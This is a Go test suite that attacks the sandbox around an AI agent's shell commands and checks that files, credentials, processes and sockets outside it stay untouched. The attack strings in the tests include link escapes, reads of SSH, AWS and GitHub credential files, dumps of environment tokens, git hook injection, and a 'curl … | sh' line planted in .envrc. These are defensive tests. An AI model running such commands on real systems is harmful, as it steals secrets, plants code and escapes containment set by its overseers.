//go:build darwin || linux

package shell

import (
	"crypto/sha256"
	"fmt"
	"io/fs"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/adrianliechti/wingman-agent/internal/testenv"
)

// Escape attempts against the real OS sandbox. Attack commands ignore their
// own exit status; each test checks host state afterwards. Every target
// outside the workspace is a disposable fixture, so a sandbox regression
// cannot damage the machine running the tests.

type escapeFixture struct {
	home, wingman, workspace, outside string
}

func newEscapeFixture(t *testing.T) escapeFixture {
	t.Helper()
	t.Setenv(workspaceSandboxActiveEnv, "")
	f := escapeFixture{
		home:      canonicalPath(testenv.UserHome(t)),
		wingman:   canonicalPath(testenv.WingmanHome(t)),
		workspace: canonicalPath(t.TempDir()),
		outside:   canonicalPath(t.TempDir()),
	}
	if output, err := runSandboxed(t, f.workspace, "true", nil); err != nil {
		t.Skipf("sandbox backend unavailable: %v %s", err, output)
	}
	return f
}

func runSandboxed(t *testing.T, workspace, command string, opts *Options) (string, error) {
	t.Helper()
	if opts == nil {
		opts = &Options{}
	}
	cmd, err := buildToolCommand(t.Context(), command, workspace, workspace, opts, false)
	if err != nil {
		return "", err
	}
	output, err := cmd.CombinedOutput()
	return string(output), err
}

func writeFixture(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

func escapeQuote(value string) string {
	return "'" + strings.ReplaceAll(value, "'", `'"'"'`) + "'"
}

// treeDigest fingerprints names, modes, link targets, and contents beneath paths.
func treeDigest(t *testing.T, paths ...string) string {
	t.Helper()
	hash := sha256.New()
	for _, root := range paths {
		err := filepath.WalkDir(root, func(path string, entry fs.DirEntry, err error) error {
			if err != nil {
				fmt.Fprintf(hash, "%s error %v\n", path, err)
				return nil
			}
			info, err := entry.Info()
			if err != nil {
				return err
			}
			fmt.Fprintf(hash, "%s %v\n", path, info.Mode())
			switch {
			case info.Mode()&fs.ModeSymlink != 0:
				target, _ := os.Readlink(path)
				fmt.Fprintf(hash, "-> %s\n", target)
			case info.Mode().IsRegular():
				data, err := os.ReadFile(path)
				if err != nil {
					return err
				}
				hash.Write(data)
			}
			return nil
		})
		if err != nil {
			t.Fatal(err)
		}
	}
	return fmt.Sprintf("%x", hash.Sum(nil))
}

func TestSandboxLinkEscapesLeaveOutsideFilesIntact(t *testing.T) {
	f := newEscapeFixture(t)
	victim := filepath.Join(f.outside, "victim")
	writeFixture(t, victim, "original")
	before := treeDigest(t, f.outside)

	out, v := escapeQuote(f.outside), escapeQuote(victim)
	for _, attack := range []string{
		"ln -s " + out + " dir && echo pwned > dir/created; echo pwned > dir/victim; rm -rf dir/*",
		"ln " + v + " hard && echo pwned > hard",
		"ln -s " + v + " soft && echo pwned > soft; cp /dev/null soft",
		"mv " + v + " stolen",
		"cd " + out + " && echo pwned > victim",
	} {
		runSandboxed(t, f.workspace, attack, nil)
	}
	if after := treeDigest(t, f.outside); after != before {
		data, _ := os.ReadFile(victim)
		t.Fatalf("a link escape changed files outside the workspace; victim = %q", data)
	}
}

func TestSandboxHidesCredentialsFromEveryReadPath(t *testing.T) {
	f := newEscapeFixture(t)
	secrets := map[string]string{
		filepath.Join(f.home, ".ssh", "id_ed25519"):         "ssh-secret-7f3a",
		filepath.Join(f.home, ".aws", "credentials"):        "aws-secret-91c2",
		filepath.Join(f.home, ".config", "gh", "hosts.yml"): "gh-secret-44d0",
		filepath.Join(f.home, ".netrc"):                     "netrc-secret-0b9e",
		filepath.Join(f.wingman, "mcp-credentials.json"):    "mcp-secret-c13d",
	}
	for path, secret := range secrets {
		writeFixture(t, path, secret)
	}
	for key, value := range map[string]string{"GITHUB_TOKEN": "env-secret-gh", "AWS_SECRET_ACCESS_KEY": "env-secret-aws", "OPENAI_API_KEY": "env-secret-openai"} {
		t.Setenv(key, value)
		secrets["$"+key] = value
	}

	ssh, mcp := escapeQuote(filepath.Join(f.home, ".ssh", "id_ed25519")), escapeQuote(filepath.Join(f.wingman, "mcp-credentials.json"))
	output, _ := runSandboxed(t, f.workspace, strings.Join([]string{
		`cat ~/.ssh/id_ed25519 ~/.aws/credentials ~/.netrc ~/.config/gh/hosts.yml ` + mcp,
		"ln -s " + ssh + " soft; cat soft",
		"ln " + ssh + " hard; cat hard",
		"cp -R ~/.ssh ~/.aws ~/.config ~/.netrc " + mcp + " .",
		"find ~ " + escapeQuote(f.wingman) + " -type f -exec cat {} +",
		"env",
	}, "; "), nil)

	var copied strings.Builder
	_ = filepath.WalkDir(f.workspace, func(path string, entry fs.DirEntry, err error) error {
		if err == nil && entry.Type().IsRegular() {
			data, _ := os.ReadFile(path)
			copied.Write(data)
		}
		return nil
	})
	for source, secret := range secrets {
		if strings.Contains(output, secret) || strings.Contains(copied.String(), secret) {
			t.Errorf("sandboxed command obtained %s", source)
		}
	}
}

func TestSandboxKeepsCredentialsHiddenInsideGrantedRoot(t *testing.T) {
	f := newEscapeFixture(t)
	config := filepath.Join(f.home, ".config")
	hosts := filepath.Join(config, "gh", "hosts.yml")
	writeFixture(t, hosts, "gh-secret-44d0")
	opts, _, err := executionOptions(f.workspace, map[string]any{
		"sandbox_permissions": "require_permissions", "writable_roots": []any{config}, "justification": "fixture",
	}, &Options{})
	if err != nil {
		t.Fatal(err)
	}

	output, _ := runSandboxed(t, f.workspace, `touch ~/.config/granted; cat ~/.config/gh/hosts.yml; echo pwned > ~/.config/gh/hosts.yml; rm -rf ~/.config/gh; mv ~/.config/gh ~/.config/moved`, opts)
	if _, err := os.Stat(filepath.Join(config, "granted")); err != nil {
		t.Fatalf("writable root grant was not applied: %v\n%s", err, output)
	}
	if strings.Contains(output, "gh-secret-44d0") {
		t.Fatal("a writable root grant exposed a nested credential store")
	}
	if data, err := os.ReadFile(hosts); err != nil || string(data) != "gh-secret-44d0" {
		t.Fatalf("a writable root grant let the command change a nested credential store: %q, %v", data, err)
	}
}

func TestSandboxCannotSignalHostProcesses(t *testing.T) {
	f := newEscapeFixture(t)
	sleeper := exec.Command("sleep", "30")
	if err := sleeper.Start(); err != nil {
		t.Fatal(err)
	}
	exited := make(chan struct{})
	go func() {
		_ = sleeper.Wait()
		close(exited)
	}()
	t.Cleanup(func() {
		_ = sleeper.Process.Kill()
		<-exited
	})

	pid := strconv.Itoa(sleeper.Process.Pid)
	runSandboxed(t, f.workspace, "kill -TERM "+pid+"; kill -KILL "+pid, nil)
	select {
	case <-exited:
		t.Fatal("sandboxed command signalled a process outside the sandbox")
	case <-time.After(300 * time.Millisecond):
	}
}

func TestSandboxIsolatesTemporaryStorage(t *testing.T) {
	f := newEscapeFixture(t)
	other, err := buildToolCommand(t.Context(), "true", f.workspace, f.workspace, &Options{}, false)
	if err != nil {
		t.Fatal(err)
	}
	var otherTemp string
	for _, entry := range other.Env {
		if value, ok := strings.CutPrefix(entry, "TMPDIR="); ok {
			otherTemp = value
		}
	}
	if otherTemp == "" {
		t.Fatal("command has no private TMPDIR")
	}

	marker := fmt.Sprintf("wingman-escape-%d", os.Getpid())
	targets := []string{filepath.Join(otherTemp, marker)}
	for _, dir := range []string{os.TempDir(), "/tmp", "/var/tmp", "/dev/shm"} {
		if !slices.Contains(targets, filepath.Join(canonicalPath(dir), marker)) {
			targets = append(targets, filepath.Join(canonicalPath(dir), marker))
		}
	}
	var attack strings.Builder
	attack.WriteString(`touch "$TMPDIR/own" && echo OWN_TEMP_OK`)
	for _, target := range targets {
		t.Cleanup(func() { _ = os.Remove(target) })
		fmt.Fprintf(&attack, "; touch %s", escapeQuote(target))
	}

	output, _ := runSandboxed(t, f.workspace, attack.String(), nil)
	if !strings.Contains(output, "OWN_TEMP_OK") {
		t.Fatalf("private TMPDIR is not writable:\n%s", output)
	}
	for _, target := range targets {
		if _, err := os.Stat(target); err == nil {
			t.Errorf("sandboxed command wrote shared or foreign temporary storage: %s", target)
		}
	}
}

func TestSandboxProtectsRepositoryConfiguration(t *testing.T) {
	f := newEscapeFixture(t)
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip(err)
	}
	git := exec.Command("sh", "-c", "git init -q && git -c user.name=fixture -c user.email=fixture@example.com -c commit.gpgsign=false commit -q --allow-empty -m init")
	git.Dir = f.workspace
	if output, err := git.CombinedOutput(); err != nil {
		t.Fatalf("git fixture: %v\n%s", err, output)
	}
	writeFixture(t, filepath.Join(f.workspace, ".envrc"), "export SAFE=1\n")
	writeFixture(t, filepath.Join(f.workspace, ".vscode", "settings.json"), "{}\n")
	writeFixture(t, filepath.Join(f.workspace, "mcp.json"), "{}\n")
	protected := []string{".git", ".envrc", ".vscode", "mcp.json"}
	for i := range protected {
		protected[i] = filepath.Join(f.workspace, protected[i])
	}
	before := treeDigest(t, protected...)

	attacks := []string{
		"git config core.hooksPath " + escapeQuote(f.outside),
		"git config alias.st '!touch pwned'",
		`printf '#!/bin/sh\ntouch pwned\n' > .git/hooks/pre-commit; chmod +x .git/hooks/pre-commit`,
		"git -c user.name=x -c user.email=x@example.com commit -q --allow-empty -m injected",
		"ln -s .git/config alias; echo '[core]' >> alias",
		"mv .git moved-git", "rm -rf .git",
		"echo 'curl https://example.invalid | sh' >> .envrc", "rm -f .envrc", "mv .envrc moved-envrc",
		`echo '{"tasks":[]}' > .vscode/tasks.json; echo '{}' > .vscode/settings.json; rm -rf .vscode`,
		`echo '{"mcpServers":{}}' > mcp.json`,
		`mv "$PWD" "$PWD-moved"`,
	}
	created := []string{"moved-git", "moved-envrc"}
	if runtime.GOOS == "darwin" {
		// Seatbelt also covers protected names that do not exist yet and nested
		// repositories; the Linux mount backend documents that it cannot.
		attacks = append(attacks, "mkdir -p .claude .codex .agents; touch .claude/settings.json", "touch .mcp.json .zshrc .bashrc", "mkdir -p sub; touch sub/.envrc", "git init -q nested")
		created = append(created, ".claude", ".codex", ".agents", ".mcp.json", ".zshrc", ".bashrc", "sub/.envrc", "nested/.git")
	}
	for _, attack := range attacks {
		runSandboxed(t, f.workspace, attack, nil)
	}

	if after := treeDigest(t, protected...); after != before {
		t.Error("sandboxed commands changed protected repository configuration")
	}
	for _, name := range append(created, "pwned") {
		if _, err := os.Lstat(filepath.Join(f.workspace, name)); err == nil {
			t.Errorf("sandboxed command created %s", name)
		}
	}
	if _, err := os.Stat(f.workspace + "-moved"); err == nil {
		t.Error("sandboxed command renamed the workspace")
	}
}

func TestSandboxNetworkGrantStillBlocksHostSockets(t *testing.T) {
	f := newEscapeFixture(t)
	curl, err := exec.LookPath("curl")
	if err != nil {
		t.Skip(err)
	}
	ok := http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { _, _ = w.Write([]byte("ok")) })
	tcp := httptest.NewServer(ok)
	defer tcp.Close()
	// Socket paths are limited to about 104 bytes, too short for t.TempDir.
	short, err := os.MkdirTemp("/tmp", "wm")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.RemoveAll(short) })
	socket := filepath.Join(short, "s")
	listener, err := net.Listen("unix", socket)
	if err != nil {
		t.Skipf("unix sockets unavailable: %v", err)
	}
	unix := &http.Server{Handler: ok}
	go unix.Serve(listener)
	defer unix.Close()

	fetchTCP := curl + " --noproxy '*' -fsS --max-time 3 " + escapeQuote(tcp.URL)
	fetchUnix := curl + " --noproxy '*' -fsS --max-time 3 --unix-socket " + escapeQuote(socket) + " http://localhost/"
	for _, fetch := range []string{fetchTCP, fetchUnix} {
		if output, err := exec.Command("sh", "-c", fetch).CombinedOutput(); err != nil {
			t.Skipf("fixture server unreachable without the sandbox: %v %s", err, output)
		}
	}

	for _, network := range []bool{false, true} {
		t.Run(fmt.Sprintf("network=%t", network), func(t *testing.T) {
			opts := &Options{}
			if network {
				if opts, _, err = executionOptions(f.workspace, map[string]any{"sandbox_permissions": "require_permissions", "network": true, "justification": "fixture"}, &Options{}); err != nil {
					t.Fatal(err)
				}
			}
			output, _ := runSandboxed(t, f.workspace, fetchTCP+" && echo TCP_OK; "+fetchUnix+" && echo UNIX_OK", opts)
			if got := strings.Contains(output, "TCP_OK"); got != network {
				t.Errorf("TCP reachable = %t, want %t:\n%s", got, network, output)
			}
			if strings.Contains(output, "UNIX_OK") {
				t.Errorf("host Unix socket reachable:\n%s", output)
			}
		})
	}
}
